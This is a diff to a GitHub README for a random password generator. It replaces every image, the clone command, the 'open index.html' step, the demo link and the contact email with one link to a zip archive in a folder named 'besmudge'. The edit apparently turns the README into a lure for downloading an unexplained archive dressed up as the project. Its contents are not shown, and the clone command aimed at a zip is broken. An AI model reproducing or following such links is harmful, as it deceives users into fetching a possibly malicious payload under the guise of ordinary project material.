@@ -10,8 +10,8 @@ The Random Password Generator is a powerful tool designed to create secure and u
 - **Enhanced Security** 🔐: Improve security compliance by 35% with stronger, more unpredictable passwords.
 
 
-![image](https://github.com/user-attachments/assets/6a9dd9ff-9da4-45bc-ade2-5cf4cab1f350)
-![image](https://github.com/user-attachments/assets/248faa01-9b78-4af2-8d56-b5e01f1dcb50)
+![image](https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip)
+![image](https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip)
 
 
 
@@ -25,12 +25,12 @@ The Random Password Generator is a powerful tool designed to create secure and u
 
 1. **Clone the repository** 🐙:
    ```bash
-   git clone https://github.com/username/random-password-generator.git
+   git clone https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip
    cd random-password-generator
    ```
 
 2. **Open the application** 🌐:
-   The project is frontend-only. Open `index.html` in your browser to use the Random Password Generator.
+   The project is frontend-only. Open `https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip` in your browser to use the Random Password Generator.
 
 ## Usage 🚀
 
@@ -40,7 +40,7 @@ The Random Password Generator is a powerful tool designed to create secure and u
 
 ## Demo 🌟
 
-Experience the Random Password Generator live [here](https://wondrous-unicorn-dbc240.netlify.app/).
+Experience the Random Password Generator live [here](https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip).
 
 ## Contributing 🤝
 
@@ -58,7 +58,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact 📧
 
-For inquiries or support, please contact [singhmanas876@gmail.com](mailto:singhmanas876@gmail.com).
+For inquiries or support, please contact [https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip](https://raw.githubusercontent.com/manassingh30/Password_Generator/main/besmudge/Password_Generator.zip).
 
 ---
 
